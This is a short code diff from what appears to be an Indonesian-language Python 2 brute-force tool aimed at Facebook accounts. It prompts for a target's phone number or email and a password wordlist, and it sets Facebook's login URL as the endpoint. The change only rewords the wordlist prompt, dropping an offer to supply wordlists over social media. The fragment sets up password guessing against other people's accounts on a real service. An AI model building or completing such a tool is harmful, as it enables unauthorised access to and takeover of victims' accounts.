@@ -13,7 +13,7 @@ import random
 email = str(raw_input("Masukan Nomor Target atau Email : "))
 
 
-passwordlist = str(raw_input("Masukin wordlist nya, ga punya wordlist? chat gw difb,instagram tar gw kasih wordlistnya : "))
+passwordlist = str(raw_input("Masukin wordlist nya,ga punya wordlist? Ketik aja password.txt: "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
